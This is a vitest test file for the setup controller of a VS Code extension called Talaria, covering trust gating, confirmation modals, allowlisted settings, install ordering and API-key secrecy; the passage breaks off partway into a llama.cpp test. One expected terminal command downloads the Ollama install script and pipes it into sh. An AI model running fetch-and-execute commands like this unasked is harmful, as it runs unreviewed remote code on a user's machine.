import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { homedir } from 'node:os';
import {
  SetupController,
  TIER2_TUNABLE_KEYS,
  MUTATING_METHODS,
  READ_ONLY_METHODS,
  isHostSourcedModel,
  composeVllmCell,
  composeLlamacppCell,
  type SetupHost,
  type SetupControllerDeps,
} from './SetupController';
import { AGENT_BACKENDS, FIM_BACKENDS, getBackend, NEXT_DEDICATED_MODEL } from './registry';
import { MODEL_CATALOG } from './modelCatalog';
import type { CatalogModel } from './modelCatalog';
import type { LlamaCppLocateResult } from './llamaCppLocator';
import type { GgufDestResult } from './modelStore';
import type { PipxLocateResult } from './pipxLocator';
import type { HermesPaths } from './pipxInstaller';
import type { OllamaStatus } from './ollamaClient';
import type { ProbeOutcome } from './remoteProbe';
import { AUTOCOMPLETE_API_KEY_SECRET } from '../../autocomplete/apiKey';
import type { SetupMethod, SetupProgress } from '../../shared/protocol';

/**
 * Task 9 behavior-contract tests (task-9-brief.md + plan §7/§8) against a
 * FAKE SetupHost + FAKE engines — no real vscode, no real subprocess/fetch.
 * The fake host RECORDS every call in `calls` (in order) so write-ORDER and
 * refusal-side-effect assertions are provable, not just outcome-based.
 */

class FakeSetupHost implements SetupHost {
  calls: string[] = [];
  trusted = true;
  settings = new Map<string, unknown>();
  secretValues = new Map<string, string>();
  globalStateStore = new Map<string, unknown>();
  modalResponses: boolean[] = [];
  passwordResponses: (string | undefined)[] = [];
  terminalsCreated: { name: string; command: string }[] = [];
  terminalsRun: { name: string; shellPath: string; args: string[] }[] = [];
  reloadOffers = 0;
  reloadCalls = 0;

  async showModal(message: string, _confirmLabel: string): Promise<boolean> {
    this.calls.push(`showModal:${message}`);
    return this.modalResponses.length > 0 ? (this.modalResponses.shift() as boolean) : true;
  }

  async showPasswordInput(_prompt: string): Promise<string | undefined> {
    this.calls.push('showPasswordInput');
    return this.passwordResponses.shift();
  }

  createTerminal(name: string, preTypedCommand: string): void {
    this.calls.push(`createTerminal:${name}`);
    this.terminalsCreated.push({ name, command: preTypedCommand });
  }

  runInTerminal(name: string, shellPath: string, shellArgs: string[]): void {
    this.calls.push(`runInTerminal:${name}`);
    this.terminalsRun.push({ name, shellPath, args: shellArgs });
  }

  getSetting<T>(key: string): T | undefined {
    return this.settings.get(key) as T | undefined;
  }

  async updateSettingGlobal(key: string, value: unknown): Promise<void> {
    this.calls.push(`write:${key}=${JSON.stringify(value)}`);
    this.settings.set(key, value);
  }

  secrets = {
    store: async (key: string, v: string): Promise<void> => {
      this.calls.push(`secrets.store:${key}`);
      this.secretValues.set(key, v);
    },
    has: async (key: string): Promise<boolean> => this.secretValues.has(key),
    delete: async (key: string): Promise<void> => {
      this.calls.push(`secrets.delete:${key}`);
      this.secretValues.delete(key);
    },
  };

  globalState = {
    get: <T,>(key: string): T | undefined => this.globalStateStore.get(key) as T | undefined,
    update: async (key: string, v: unknown): Promise<void> => {
      this.calls.push(`globalState:${key}`);
      this.globalStateStore.set(key, v);
    },
  };

  isTrusted(): boolean {
    return this.trusted;
  }

  offerReload(): void {
    this.calls.push('offerReload');
    this.reloadOffers++;
  }

  reload(): void {
    this.calls.push('reload');
    this.reloadCalls++;
  }
}

const OK_PIPX_LOCATE: PipxLocateResult = {
  ok: true,
  env: { pipxPath: '/usr/bin/pipx', venvsRoot: '/home/u/.local/share/pipx/venvs', defaultPythonVersion: '3.12.0' },
};

const OK_HERMES_PATHS: HermesPaths = {
  venvRoot: '/home/u/.local/share/pipx/venvs/hermes-agent',
  hermes: '/home/u/.local/share/pipx/venvs/hermes-agent/bin/hermes',
  hermesAcp: '/home/u/.local/share/pipx/venvs/hermes-agent/bin/hermes-acp',
  python: '/home/u/.local/share/pipx/venvs/hermes-agent/bin/python',
};

// --- T5: os-release fixtures (mirror osDetect.test.ts's family table) --------

const OS_FEDORA_44 = 'NAME="Fedora Linux"\nID=fedora\nVERSION_ID=44\nPRETTY_NAME="Fedora Linux 44 (Workstation Edition)"\n';
const OS_UBUNTU_2404 = 'PRETTY_NAME="Ubuntu 24.04 LTS"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="24.04"\n';
const OS_UBUNTU_2204 = 'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="22.04"\n';
const OS_UBUNTU_2604 = 'PRETTY_NAME="Ubuntu 26.04 LTS"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="26.04"\n';
const OS_DEBIAN_13 = 'PRETTY_NAME="Debian GNU/Linux 13 (trixie)"\nID=debian\nVERSION_ID="13"\n';
const OS_ARCH = 'NAME="Arch Linux"\nPRETTY_NAME="Arch Linux"\nID=arch\n';
const OS_TUMBLEWEED = 'ID=opensuse-tumbleweed\nID_LIKE="opensuse suse"\nVERSION_ID="20260803"\nPRETTY_NAME="openSUSE Tumbleweed"\n';

// §6 copy, verbatim (drift-locked here AND used by assertions below).
const CONTAINER_NOTE_COPY =
  "Talaria can't tell which system your terminal acts on (VS Code appears to run in a sandbox/container) — run the install commands in a terminal on your host system, then re-check.";
const PIPX_MISSING_KNOWN_COPY = 'pipx was not found on your PATH. Open a terminal to install it, then re-check.';
const PIPX_MISSING_UNKNOWN_COPY =
  "pipx was not found, and this Linux distribution wasn't recognized — install pipx with your system's package manager, then re-check.";
// T11 (§3): the §6 "probe-timeout detail (C1)" copy, verbatim — this is what
// the REAL pipxLocator.locatePipx() composes for {reason:'probe-timeout'};
// the fake deps below just need SOME fixed string to prove the pass-through.
const PROBE_TIMEOUT_COPY =
  "Your login shell didn't answer in time — a slow shell profile (nvm, conda, a network home directory) can cause this. It's usually transient: press Re-check.";

function makeFakeDeps(overrides: Partial<SetupControllerDeps> = {}): { deps: SetupControllerDeps; calls: string[] } {
  const calls: string[] = [];
  const deps: SetupControllerDeps = {
    locatePipx: async (): Promise<PipxLocateResult> => {
      calls.push('locatePipx');
      return OK_PIPX_LOCATE;
    },
    installHermes: async (_recipe, _env, onEvent, _signal): Promise<HermesPaths> => {
      calls.push('installHermes');
      onEvent({ kind: 'phase', phase: 'pipx-install' });
      onEvent({ kind: 'log', line: 'installing...' });
      onEvent({ kind: 'phase', phase: 'verify' });
      onEvent({ kind: 'done', paths: OK_HERMES_PATHS });
      return OK_HERMES_PATHS;
    },
    probeOllama: async (): Promise<OllamaStatus> => {
      calls.push('probeOllama');
      return { running: false, detail: 'not running' };
    },
    pullModel: async (_endpoint, _model, onProgress): Promise<void> => {
      calls.push('pullModel');
      onProgress({ status: 'success' });
    },
    probeRemote: async (): Promise<ProbeOutcome> => {
      calls.push('probeRemote');
      return { ok: true, detail: 'ok' };
    },
    registry: { AGENT_BACKENDS, FIM_BACKENDS, getBackend },
    getNextEditSource: () => 'off',
    // Task 13: default = "no ACP initialize has surfaced auth methods yet"
    // (mock backend / before connect) → provider card 'waiting-agent'.
    getAdvertisedAuthMethods: () => undefined,
    // T13 (beta.5 §4.4): the vetted-ingest seams. With the REAL registry's
    // sha256 === '' the gate refuses at (a) — these defaults exist so the
    // spies can prove they were NEVER reached from this file's tests.
    verifyHfDigest: async (): Promise<{ ok: true } | { ok: false; reason: string }> => {
      calls.push('verifyHfDigest');
      return { ok: true };
    },
    ingestGguf: async (): Promise<void> => {
      calls.push('ingestGguf');
    },
    // T7 (beta.6): the live-oid resolver seam — never reached from this
    // file's tests (the provisionModel suites have their own harnesses);
    // fails closed if it ever is.
    resolveLfsOid: async (): Promise<{ ok: true; oid: string } | { ok: false; reason: string }> => {
      calls.push('resolveLfsOid');
      return { ok: false, reason: 'not used here' };
    },
    // T5: default = a readable Fedora host — keeps every pre-T5 behavior
    // test (bootstrap-terminal `sudo dnf install pipx` et al.) valid while
    // per-family tests override with their own fixture.
    readOsRelease: async (): Promise<{ text?: string; containerMismatch?: boolean }> => {
      calls.push('readOsRelease');
      return { text: OS_FEDORA_44 };
    },
    // T6 (beta.6): the llama.cpp probe default NEVER settles — the memo's
    // 'checking' state stays deterministic and no legacy onStatusChanged
    // count is disturbed by a stray settle fire; tests that need a settled
    // state override with their own scripted resolution.
    locateLlamaServer: (): Promise<LlamaCppLocateResult> => {
      calls.push('locateLlamaServer');
      return new Promise<LlamaCppLocateResult>(() => {});
    },
    scanStorePresence: async (): Promise<ReadonlyMap<string, boolean>> => {
      calls.push('scanStorePresence');
      return new Map<string, boolean>();
    },
    // Composed under the REAL homedir so the controller's `~`-redaction is
    // provable on the wire (redact splits on `homedir()` exactly).
    storeDest: (hfRepo: string, file: string): GgufDestResult => {
      calls.push('storeDest');
      const destDir = `${homedir()}/.local/share/talaria/models/${hfRepo}`;
      return { ok: true, destDir, destFile: file, destPath: `${destDir}/${file}` };
    },
    checkedStoreDest: async (hfRepo: string, file: string): Promise<GgufDestResult> => {
      calls.push('checkedStoreDest');
      const destDir = `${homedir()}/.local/share/talaria/models/${hfRepo}`;
      return { ok: true, destDir, destFile: file, destPath: `${destDir}/${file}` };
    },
    downloadGgufToStore: async (): Promise<void> => {
      calls.push('downloadGgufToStore');
    },
    ...overrides,
  };
  return { deps, calls };
}

function makeController(hostOverrides: Partial<FakeSetupHost> = {}, depsOverrides: Partial<SetupControllerDeps> = {}) {
  const host = new FakeSetupHost();
  Object.assign(host, hostOverrides);
  const { deps, calls: depCalls } = makeFakeDeps(depsOverrides);
  const controller = new SetupController(host, deps);
  return { host, deps, depCalls, controller };
}

// --- FM-14: trust gate ------------------------------------------------------

describe('FM-14: mutating methods refused when untrusted', () => {
  const MUTATING: { method: SetupMethod; params: unknown }[] = [
    { method: 'setup.install', params: { backendId: 'hermes' } },
    { method: 'setup.applyAgent', params: { backendId: 'hermes' } },
    { method: 'setup.applyFim', params: { backendId: 'ollama' } },
    { method: 'setup.setApiKey', params: {} },
    { method: 'setup.pullModel', params: { model: 'qwen2.5-coder:1.5b-base' } },
    { method: 'setup.saveAgentModel', params: { modelId: 'devstral-24b', backend: 'ollama', endpoint: 'http://127.0.0.1:11434' } },
    { method: 'setup.openProviderWizard', params: {} },
    { method: 'setup.openInstallTerminal', params: { backendId: 'ollama' } },
    { method: 'setup.openBootstrapTerminal', params: {} },
    { method: 'setup.reload', params: {} },
    { method: 'setup.setNextEdit', params: { backend: 'ollama', endpoint: 'http://127.0.0.1:11434', model: 'x' } },
    { method: 'setup.setRag', params: { enabled: true } },
    { method: 'setup.setTunable', params: { key: TIER2_TUNABLE_KEYS[0], value: 100 } },
  ];

  for (const { method, params } of MUTATING) {
    it(`refuses '${method}' with no side effect when workspace is untrusted`, async () => {
      const { host, controller } = makeController({ trusted: false });
      const result = await controller.handle(method, params);
      expect(result.ok).toBe(false);
      expect(host.calls).toEqual([]); // no modal, no write, no terminal, no secret op
    });
  }

  it('read-only setup.testRemote still works when untrusted (not the trust refusal)', async () => {
    const { controller } = makeController({ trusted: false });
    const result = await controller.handle('setup.testRemote', { backendId: 'ollama' });
    // The fake probeRemote resolves {ok:true} by default — proves the call
    // actually reached the engine instead of being short-circuited by the
    // trust gate (which would have returned the pinned trust-refusal reason).
    expect(result).toEqual({ ok: true });
  });

  it('read-only setup.recheck still works when untrusted', async () => {
    const { controller } = makeController({ trusted: false });
    const result = await controller.handle('setup.recheck', {});
    expect(result).toEqual({ ok: true });
  });

  it('setup.cancel still works when untrusted', async () => {
    const { controller } = makeController({ trusted: false });
    const result = await controller.handle('setup.cancel', { op: 'install', id: 'hermes' });
    expect(result).toEqual({ ok: true });
  });

  it('status() still renders when untrusted', async () => {
    const { controller } = makeController({ trusted: false });
    const data = await controller.status();
    expect(data.trusted).toBe(false);
  });
});

// --- FM-13: Tier-1 modal decline -> no side effect --------------------------

describe('FM-13: Tier-1 modal decline -> {ok:false, reason:"declined"} with NO side effect', () => {
  it('setup.install: decline -> locatePipx/installHermes never called, no writes', async () => {
    const { host, depCalls, controller } = makeController({ modalResponses: [false] });
    const result = await controller.handle('setup.install', { backendId: 'hermes' });
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(depCalls).toEqual([]);
    expect(host.calls.filter((c) => c.startsWith('write:') || c.startsWith('globalState:'))).toEqual([]);
    expect(host.reloadOffers).toBe(0);
  });

  it('setup.applyFim: decline -> no settings written', async () => {
    const { host, controller } = makeController({ modalResponses: [false] });
    const result = await controller.handle('setup.applyFim', { backendId: 'ollama', endpoint: 'http://127.0.0.1:11434' });
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(host.settings.size).toBe(0);
  });

  it('setup.setNextEdit: decline -> no settings written', async () => {
    const { host, controller } = makeController({ modalResponses: [false] });
    const result = await controller.handle('setup.setNextEdit', {
      backend: 'ollama',
      endpoint: 'http://127.0.0.1:11434',
      model: 'qwen2.5-coder:1.5b-base',
    });
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(host.settings.size).toBe(0);
  });

  it('setup.setRag: decline -> no settings written', async () => {
    const { host, controller } = makeController({ modalResponses: [false] });
    const result = await controller.handle('setup.setRag', { enabled: false });
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(host.settings.size).toBe(0);
  });

  it('setup.openProviderWizard: decline -> runInTerminal never called', async () => {
    const { host, controller } = makeController({ modalResponses: [false], settings: settingsMap({ 'talaria.hermesPath': '/x/bin/hermes' }) });
    const result = await controller.handle('setup.openProviderWizard', {});
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(host.terminalsRun).toEqual([]);
  });

  it('setup.openInstallTerminal: decline -> createTerminal never called', async () => {
    const { host, controller } = makeController({ modalResponses: [false] });
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'ollama' });
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(host.terminalsCreated).toEqual([]);
  });

  it('setup.openBootstrapTerminal: decline -> createTerminal never called', async () => {
    const { host, controller } = makeController({ modalResponses: [false] });
    const result = await controller.handle('setup.openBootstrapTerminal', {});
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(host.terminalsCreated).toEqual([]);
  });

  it('setup.applyAgent: decline -> no settings written, no reload offered', async () => {
    const { host, controller } = makeController({ modalResponses: [false] });
    const result = await controller.handle('setup.applyAgent', { backendId: 'hermes' });
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(host.settings.size).toBe(0);
    expect(host.reloadOffers).toBe(0);
  });

  it('setup.pullModel: decline -> deps.pullModel never called', async () => {
    const { depCalls, controller } = makeController({ modalResponses: [false] });
    const result = await controller.handle('setup.pullModel', { model: 'qwen2.5-coder:1.5b-base' });
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(depCalls).toEqual([]);
  });
});

// --- FM-16: setTunable allowlist --------------------------------------------

describe('FM-16: setup.setTunable allowlist (D9)', () => {
  it('refuses a key outside TIER2_TUNABLE_KEYS with an exact reason, no write, no modal', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setTunable', {
      key: 'talaria.autocomplete.crossFile.prefixInjectionRemote', // Tier-1, NOT Tier-2
      value: true,
    });
    expect(result).toEqual({ ok: false, reason: 'not a tunable' });
    expect(host.settings.size).toBe(0);
    expect(host.calls.some((c) => c.startsWith('showModal'))).toBe(false);
  });

  it('refuses a completely unknown key', async () => {
    const { controller } = makeController();
    const result = await controller.handle('setup.setTunable', { key: 'talaria.backend', value: 'acp' });
    expect(result).toEqual({ ok: false, reason: 'not a tunable' });
  });

  it('allowlisted key writes host-validated value with NO modal', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setTunable', { key: 'talaria.autocomplete.debounceMs', value: 500 });
    expect(result).toEqual({ ok: true });
    expect(host.settings.get('talaria.autocomplete.debounceMs')).toBe(500);
    expect(host.calls.some((c) => c.startsWith('showModal'))).toBe(false);
  });

  it('every TIER2_TUNABLE_KEYS entry round-trips a valid value with no modal', async () => {
    const validValues: Record<string, unknown> = {
      'talaria.autocomplete.debounceMs': 400,
      'talaria.autocomplete.maxPromptTokens': 2048,
      'talaria.autocomplete.temperature': 0.5,
      'talaria.autocomplete.crossFile.enabled': false,
      'talaria.autocomplete.crossFile.prefixInjection': true,
      'talaria.autocomplete.crossFile.warmUp': true,
      'talaria.rag.dims': 768,
      'talaria.rag.maxChunkTokens': 1024,
      'talaria.rag.debounceMs': 750,
      'talaria.rag.excludeGlobs': ['**/node_modules/**'],
    };
    for (const key of TIER2_TUNABLE_KEYS) {
      const { host, controller } = makeController();
      const result = await controller.handle('setup.setTunable', { key, value: validValues[key] });
      expect(result, `key=${key}`).toEqual({ ok: true });
      expect(host.settings.get(key)).toEqual(validValues[key]);
    }
  });

  it('rejects a host-invalid value for an allowlisted key without writing', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setTunable', { key: 'talaria.autocomplete.debounceMs', value: -5 });
    expect(result.ok).toBe(false);
    expect(host.settings.size).toBe(0);
  });
});

// --- FM-12: install single-flight -------------------------------------------

describe('FM-12: setup.install single-flight', () => {
  it('a second concurrent install is refused while the first is still in flight', async () => {
    const host = new FakeSetupHost();
    // Modal never resolves during this test — keeps the first call "in flight".
    let resolveModal: (v: boolean) => void = () => {};
    host.showModal = () =>
      new Promise<boolean>((resolve) => {
        resolveModal = resolve;
      });
    const { deps } = makeFakeDeps();
    const controller = new SetupController(host, deps);

    const first = controller.handle('setup.install', { backendId: 'hermes' });
    const second = await controller.handle('setup.install', { backendId: 'hermes' });
    expect(second).toEqual({ ok: false, reason: 'install already running' });

    resolveModal(false); // let the first finish (declined) so the test can end cleanly
    await first;
  });
});

// --- FM-12: pullModel single-flight (latch BEFORE the modal) ----------------

describe('FM-12: setup.pullModel single-flight', () => {
  it('a second concurrent pullModel for the same model is refused while the first modal is still pending', async () => {
    const host = new FakeSetupHost();
    // Modal never resolves during this test — keeps the first call "in flight".
    let resolveModal: (v: boolean) => void = () => {};
    host.showModal = () =>
      new Promise<boolean>((resolve) => {
        resolveModal = resolve;
      });
    const { deps } = makeFakeDeps();
    const controller = new SetupController(host, deps);

    const first = controller.handle('setup.pullModel', { model: 'qwen2.5-coder:1.5b-base' });
    const second = await controller.handle('setup.pullModel', { model: 'qwen2.5-coder:1.5b-base' });
    expect(second).toEqual({ ok: false, reason: 'pull already running' });

    resolveModal(false); // let the first finish (declined) so the test can end cleanly
    await first;
  });
});

// --- Happy install: full order proof ----------------------------------------

describe('happy install: fail-closed ORDER (locatePipx -> installHermes -> writes together -> globalState -> offerReload)', () => {
  it('performs every step in the pinned order and returns ok:true', async () => {
    const { host, depCalls, controller } = makeController();
    const result = await controller.handle('setup.install', { backendId: 'hermes' });
    expect(result).toEqual({ ok: true });

    expect(depCalls).toEqual(['locatePipx', 'installHermes']);

    const relevant = host.calls.filter(
      (c) =>
        c.startsWith('showModal') ||
        c.startsWith('write:talaria.hermesPath') ||
        c.startsWith('write:talaria.pythonPath') ||
        c.startsWith('write:talaria.backend') ||
        c.startsWith('globalState:talaria.setup.hermesInstall') ||
        c === 'offerReload',
    );
    expect(relevant.map((c) => c.split('=')[0])).toEqual([
      expect.stringContaining('showModal:'),
      'write:talaria.hermesPath',
      'write:talaria.pythonPath',
      'write:talaria.backend',
      'globalState:talaria.setup.hermesInstall',
      'offerReload',
    ]);

    expect(host.settings.get('talaria.hermesPath')).toBe(OK_HERMES_PATHS.hermes);
    expect(host.settings.get('talaria.pythonPath')).toBe(OK_HERMES_PATHS.python);
    expect(host.settings.get('talaria.backend')).toBe('acp');
    const record = host.globalStateStore.get('talaria.setup.hermesInstall') as {
      version: string;
      venvRoot: string;
      installedAt: string;
    };
    expect(record.version).toBe('0.18.2');
    expect(record.venvRoot).toBe(OK_HERMES_PATHS.venvRoot);
    expect(typeof record.installedAt).toBe('string');
  });

  it('writes NOTHING when locatePipx resolves ok:false (fail-closed before install)', async () => {
    const { host, depCalls, controller } = makeController(
      {},
      {
        locatePipx: async () => {
          depCallsRecorder.push('locatePipx');
          return { ok: false, reason: 'pipx-missing', detail: 'no pipx' };
        },
      },
    );
    const result = await controller.handle('setup.install', { backendId: 'hermes' });
    // T5 C-17: the returned reason is a §6-grade sentence, never the bare enum.
    expect(result).toEqual({ ok: false, reason: PIPX_MISSING_KNOWN_COPY });
    expect(host.settings.size).toBe(0);
    expect(host.reloadOffers).toBe(0);
    void depCalls; // depCalls from makeFakeDeps default isn't used here
  });
  const depCallsRecorder: string[] = [];

  it('T4 M-2: a REJECTING locatePipx never becomes an unhandled rejection — surfaces as {ok:false}', async () => {
    const { host, controller } = makeController(
      {},
      {
        locatePipx: async () => {
          throw new Error('pipx vanished mid-flow');
        },
      },
    );
    const result = await controller.handle('setup.install', { backendId: 'hermes' });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toContain('pipx vanished');
    expect(host.settings.size).toBe(0);
  });

  it('writes NOTHING when installHermes rejects (verify failure) — fail-closed', async () => {
    const { host, controller } = makeController(
      {},
      {
        installHermes: async () => {
          throw new Error('hermes install failed at phase "verify": no marker');
        },
      },
    );
    const result = await controller.handle('setup.install', { backendId: 'hermes' });
    expect(result.ok).toBe(false);
    expect(host.settings.size).toBe(0);
    expect(host.reloadOffers).toBe(0);
  });

  it('a post-verify updateSettingGlobal rejection returns {ok:false} instead of throwing (fault-tolerant)', async () => {
    const host = new FakeSetupHost();
    const realUpdate = host.updateSettingGlobal.bind(host);
    host.updateSettingGlobal = async (key: string, value: unknown): Promise<void> => {
      if (key === 'talaria.backend') throw new Error('EBUSY: settings.json is locked');
      return realUpdate(key, value);
    };
    const { deps } = makeFakeDeps();
    const controller = new SetupController(host, deps);

    // handle() must not throw — a rejecting write is a returned error, not
    // an unhandled rejection out of the controller.
    const result = await controller.handle('setup.install', { backendId: 'hermes' });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toContain('settings.json is locked');

    // Partial write: hermesPath/pythonPath landed before the rejection, but
    // the backend switch (and everything after it) never happened — the
    // fail-safe state the finding describes (backend stays unset/'mock').
    expect(host.settings.get('talaria.hermesPath')).toBe(OK_HERMES_PATHS.hermes);
    expect(host.settings.get('talaria.backend')).toBeUndefined();
    expect(host.globalStateStore.has('talaria.setup.hermesInstall')).toBe(false);
    expect(host.reloadOffers).toBe(0);
  });
});

// --- setup.setApiKey ----------------------------------------------------------

describe('setup.setApiKey: password input -> secrets.store, never echoed', () => {
  it('stores the entered key under AUTOCOMPLETE_API_KEY_SECRET', async () => {
    const { host, controller } = makeController({ passwordResponses: ['sk-super-secret-123'] });
    const result = await controller.handle('setup.setApiKey', {});
    expect(result).toEqual({ ok: true });
    expect(host.secretValues.get(AUTOCOMPLETE_API_KEY_SECRET)).toBe('sk-super-secret-123');
  });

  it('cancelling the password prompt declines with no secrets.store call', async () => {
    const { host, controller } = makeController({ passwordResponses: [undefined] });
    const result = await controller.handle('setup.setApiKey', {});
    expect(result).toEqual({ ok: false, reason: 'declined' });
    expect(host.calls.some((c) => c.startsWith('secrets.store'))).toBe(false);
  });

  it('clear:true shows a modal and deletes the secret on accept', async () => {
    const { host, controller } = makeController({ modalResponses: [true] });
    const result = await controller.handle('setup.setApiKey', { clear: true });
    expect(result).toEqual({ ok: true });
    expect(host.calls).toContain(`secrets.delete:${AUTOCOMPLETE_API_KEY_SECRET}`);
  });

  it('the raw key never appears anywhere in status() output — only apiKeySet:boolean', async () => {
    const { controller } = makeController({ passwordResponses: ['sk-super-secret-123'] });
    await controller.handle('setup.setApiKey', {});
    const data = await controller.status();
    const serialized = JSON.stringify(data);
    expect(serialized).not.toContain('sk-super-secret-123');
    const codestral = data.fim.options.find((o) => o.id === 'codestral');
    expect(codestral?.remote?.apiKeySet).toBe(true);
  });
});

// --- setup.applyFim: modal shows old->new endpoint --------------------------

describe('setup.applyFim: Tier-1 modal names old->new endpoint', () => {
  it('modal message contains both the old and the new endpoint', async () => {
    const { host, controller } = makeController({ settings: settingsMap({ 'talaria.autocomplete.endpoint': 'http://old-host:9000' }) });
    const result = await controller.handle('setup.applyFim', { backendId: 'ollama', endpoint: 'http://127.0.0.1:11434' });
    expect(result).toEqual({ ok: true });
    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
    expect(modalCall).toContain('http://old-host:9000');
    expect(modalCall).toContain('http://127.0.0.1:11434');
    expect(host.settings.get('talaria.autocomplete.backend')).toBe('ollama');
    expect(host.settings.get('talaria.autocomplete.endpoint')).toBe('http://127.0.0.1:11434');
  });

  it('refuses an invalid endpoint URL before showing any modal', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.applyFim', { backendId: 'ollama', endpoint: 'not-a-url' });
    expect(result.ok).toBe(false);
    expect(host.calls).toEqual([]);
  });
});

// --- setup.setNextEdit ---------------------------------------------------------

describe('setup.setNextEdit: validates URL then Tier-1-writes the three keys', () => {
  it('invalid endpoint is refused before any modal/write', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setNextEdit', { backend: 'ollama', endpoint: 'ftp://bad', model: 'x' });
    expect(result.ok).toBe(false);
    expect(host.calls).toEqual([]);
  });

  it('valid input shows modal then writes backend+endpoint+model together', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setNextEdit', {
      backend: 'openai-compat',
      endpoint: 'http://127.0.0.1:8000',
      model: 'qwen2.5-coder:1.5b-base',
    });
    expect(result).toEqual({ ok: true });
    expect(host.settings.get('talaria.nextEdit.backend')).toBe('openai-compat');
    expect(host.settings.get('talaria.nextEdit.endpoint')).toBe('http://127.0.0.1:8000');
    expect(host.settings.get('talaria.nextEdit.model')).toBe('qwen2.5-coder:1.5b-base');
    expect(host.settings.has('talaria.nextEdit.dedicatedBackendId')).toBe(false); // never sent -> never written
  });

  // beta.6 T8 (CC-10): additive dedicatedBackendId plumbing.
  it('a valid dedicatedBackendId is written alongside the three keys', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setNextEdit', {
      backend: 'ollama',
      endpoint: 'http://127.0.0.1:11434',
      model: 'sweep-next-edit-v2-7b:q4_k_m',
      dedicatedBackendId: 'llamacpp',
    });
    expect(result).toEqual({ ok: true });
    expect(host.settings.get('talaria.nextEdit.dedicatedBackendId')).toBe('llamacpp');
  });

  it('an invalid dedicatedBackendId is refused before any modal/write', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setNextEdit', {
      backend: 'ollama',
      endpoint: 'http://127.0.0.1:11434',
      model: 'x',
      dedicatedBackendId: 'bogus',
    });
    expect(result.ok).toBe(false);
    expect(host.calls).toEqual([]);
  });
});

// --- setup.setRag ----------------------------------------------------------

describe('setup.setRag: Tier-1 writes', () => {
  it('writes only the provided fields after a modal accept', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setRag', { enabled: false, embedModel: 'qwen3-embedding:0.6b' });
    expect(result).toEqual({ ok: true });
    expect(host.settings.get('talaria.rag.enabled')).toBe(false);
    expect(host.settings.get('talaria.rag.embedModel')).toBe('qwen3-embedding:0.6b');
    expect(host.settings.has('talaria.rag.indexDir')).toBe(false);
    expect(host.settings.has('talaria.rag.embedBackend')).toBe(false); // never sent -> never written
  });

  // beta.6 T8 (CC-10): additive embedBackend plumbing.
  it('a valid embedBackend is written', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setRag', { embedBackend: 'llamacpp' });
    expect(result).toEqual({ ok: true });
    expect(host.settings.get('talaria.rag.embedBackend')).toBe('llamacpp');
  });

  it('an invalid embedBackend is refused with no writes', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.setRag', { embedBackend: 'bogus' });
    expect(result.ok).toBe(false);
    expect(host.calls).toEqual([]);
  });
});

// --- setup.openProviderWizard ------------------------------------------------

describe('setup.openProviderWizard: runInTerminal(name, <hermesAcp>, ["--setup"])', () => {
  it('derives the hermes-acp sibling path and runs it with --setup', async () => {
    const { host, controller } = makeController({
      settings: settingsMap({ 'talaria.hermesPath': '/home/u/.local/share/pipx/venvs/hermes-agent/bin/hermes' }),
    });
    const result = await controller.handle('setup.openProviderWizard', {});
    expect(result).toEqual({ ok: true });
    expect(host.terminalsRun).toEqual([
      {
        name: 'Hermes Provider Setup',
        shellPath: '/home/u/.local/share/pipx/venvs/hermes-agent/bin/hermes-acp',
        args: ['--setup'],
      },
    ]);
  });

  it('refuses when hermes is not installed yet (no hermesPath)', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.openProviderWizard', {});
    expect(result.ok).toBe(false);
    expect(host.terminalsRun).toEqual([]);
    expect(host.calls).toEqual([]); // never even shows the modal
  });
});

// --- setup.openInstallTerminal -----------------------------------------------

describe('setup.openInstallTerminal: createTerminal pre-typed only', () => {
  it('creates a terminal with the exact guided-terminal command', async () => {
    const { host, controller } = makeController();
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'ollama' });
    expect(result).toEqual({ ok: true });
    expect(host.terminalsCreated).toEqual([
      { name: 'Ollama install', command: 'curl -fsSL https://ollama.com/install.sh | sh' },
    ]);
  });

  it('refuses for a backend with no guided-terminal recipe (hermes is pipx)', async () => {
    const { controller } = makeController();
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'hermes' });
    expect(result.ok).toBe(false);
  });

  it('ollama: packageKey absent — the OS engine is NEVER consulted (byte-identical regression lock)', async () => {
    let osReads = 0;
    const { host, controller } = makeController(
      {},
      {
        readOsRelease: async () => {
          osReads++;
          return { text: OS_FEDORA_44 };
        },
      },
    );
    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'ollama' });
    expect(result).toEqual({ ok: true });
    expect(host.terminalsCreated).toEqual([
      { name: 'Ollama install', command: 'curl -fsSL https://ollama.com/install.sh | sh' },
    ]);
    expect(osReads).toBe(0);
  });
});

// --- T6: setup.openInstallTerminal(llamacpp) routes through the OS engine ---

describe('T6: setup.openInstallTerminal(llamacpp) — engine-composed command, fail-open CLOSED (S-F9)', () => {
  it('fedora: the engine value (identical to the Fedora-shaped static command)', async () => {
